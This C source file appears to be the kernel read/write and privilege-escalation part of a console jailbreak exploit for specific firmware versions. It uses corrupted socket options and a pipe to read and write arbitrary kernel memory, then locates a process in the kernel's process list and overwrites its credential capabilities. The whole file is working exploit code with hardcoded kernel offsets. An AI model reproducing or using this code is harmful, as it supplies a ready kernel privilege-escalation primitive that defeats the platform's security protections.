#include "imports.h"

// Store necessary sockets/pipe for corruption.
int _master_sock;
int _victim_sock;
int _rw_pipe[2];
uint64_t _pipe_addr;

uint32_t version = 0;

#define V300 0x3000000
#define V310 0x3100000
#define V320 0x3200000
#define V321 0x3210000
#define V400 0x4000000
#define V402 0x4020000
#define V403 0x4030000
#define V450 0x4500000
#define V451 0x4510000


const unsigned long KERNEL_OFFSET_PROC_P_UCRED = 0x40;
const unsigned long KERNEL_OFFSET_PROC_P_FD = 0x48;
const unsigned long KERNEL_OFFSET_PROC_P_PID = 0xBC;
const unsigned long KERNEL_OFFSET_UCRED_CR_SCECAPS = 0x60;

unsigned int
kernel_get_fw_version(void) {
	unsigned int version = 0;
	unsigned long size = sizeof(version);

	if (sysctlbyname("kern.sdk_version", &version, (uint64_t*)&size, 0, 0)) {
		return 0;
	}

	return version;
}

static size_t get_proc_pid_offset(void) {
	if (version == 0) {
		version = kernel_get_fw_version();
	}
	switch (version) {
	case V300:
	case V310:
	case V320:
	case V321:
		return 0x276DC58;
	case V400:
	case V402:
	case V403:
	case V450:
	case V451:
		return 0x27EDCB8;
	default:
		return -1;
	}
}

static size_t get_allproc_offset(void) {
	if (version == 0) {
		version = kernel_get_fw_version();
	}
	switch (version) {
	case V300:
	case V310:
	case V320:
	case V321:
		return 0x276DC58;
	case V400:
	case V402:
	case V403:
	case V450:
	case V451:
		return 0x27EDCB8;
	default:
		return -1;
	}
}

void kernel_init_rw(int master_sock, int victim_sock, int* rw_pipe, uint64_t pipe_addr)
{
	_master_sock = master_sock;
	_victim_sock = victim_sock;
	_rw_pipe[0] = rw_pipe[0];
	_rw_pipe[1] = rw_pipe[1];
	_pipe_addr = pipe_addr;
}

// Internal kwrite function - not friendly, only for setting up better primitives.
int kwrite(uint64_t addr, uint64_t* data) {
	uint64_t victim_buf[3];

	if (!(addr & 0xffff000000000000)) {
		return -1;
	}

	victim_buf[0] = addr;
	victim_buf[1] = 0;
	victim_buf[2] = 0;

	if (sceNetSetsockopt(_master_sock, 41, 46, victim_buf, 0x14)) {
		return -1;
	}
	if (sceNetSetsockopt(_victim_sock, 41, 46, data, 0x14)) {
		return -1;
	}
	return 0;
}

// Public API function to write kernel data.
int kernel_copyin(void* src, uint64_t kdest, uint64_t length)
{
	uint64_t write_buf[3];

	// Set pipe flags
	write_buf[0] = 0;
	write_buf[1] = 0x4000000000000000;
	write_buf[2] = 0;
	if (kwrite(_pipe_addr, (uint64_t*)&write_buf)) {
		return -1;
	}

	// Set pipe data addr
	write_buf[0] = kdest;
	write_buf[1] = 0;
	write_buf[2] = 0;
	if (kwrite(_pipe_addr + 0x10, (uint64_t*)&write_buf)) {
		return -1;
	}

	// Perform write across pipe
	if (sceKernelWrite(_rw_pipe[1], src, length) < 0) {
		return -1;
	}

	return 0;
}

int kernel_copyout(uint64_t ksrc, void* dest, uint64_t length)
{
	uint64_t write_buf[3];

	// Set pipe flags
	write_buf[0] = 0x4000000040000000;
	write_buf[1] = 0x4000000000000000;
	write_buf[2] = 0;
	if (kwrite(_pipe_addr, (uint64_t*)&write_buf)) {
		return -1;
	}

	// Set pipe data addr
	write_buf[0] = ksrc;
	write_buf[1] = 0;
	write_buf[2] = 0;
	if (kwrite(_pipe_addr + 0x10, (uint64_t*)&write_buf)) {
		return -1;
	}

	// Perform read across pipe
	if (sceKernelRead(_rw_pipe[0], dest, length) < 0) {
		return -1;
	}
	return 0;
}

unsigned long
kernel_get_proc(unsigned int pid) {
  unsigned int other_pid = 0;
  unsigned long addr = 0;
  unsigned long next = 0;

  if(kernel_copyout(get_allproc_offset(), &addr, sizeof(addr))) {
    return 0;
  }

  while(addr) {
    if(kernel_copyout(addr + KERNEL_OFFSET_PROC_P_PID, &other_pid,
		      sizeof(other_pid))) {
      return 0;
    }

    if(pid == other_pid) {
      break;
    }

    if(kernel_copyout(addr, &next, sizeof(next))) {
      return 0;
    }

    addr = next;
  }

  return addr;
}

unsigned long kernel_get_proc_ucred(unsigned int pid) {
	unsigned long proc = 0;
	unsigned long ucred = 0;

	if (!(proc = kernel_get_proc(pid))) {
		return 0;
	}

	if (kernel_copyout(proc + KERNEL_OFFSET_PROC_P_UCRED, &ucred,
		sizeof(ucred))) {
		return 0;
	}

	return ucred;
}

int32_t kernel_set_ucred_caps(int pid, uint8_t caps[16]) {
	unsigned long ucred = 0;

	if (!(ucred = kernel_get_proc_ucred(pid))) {
		return -1;
	}

	if (kernel_copyin(caps, ucred + KERNEL_OFFSET_UCRED_CR_SCECAPS, 16)) {
		return -1;
	}

	return 0;
}

int32_t kernel_get_ucred_caps(int pid, uint8_t caps[16])
{
	unsigned long ucred = 0;

	if (!(ucred = kernel_get_proc_ucred(pid))) {
		return -1;
	}

	if (kernel_copyout(ucred + KERNEL_OFFSET_UCRED_CR_SCECAPS, caps, 16)) {
		return -1;
	}

	return 0;
}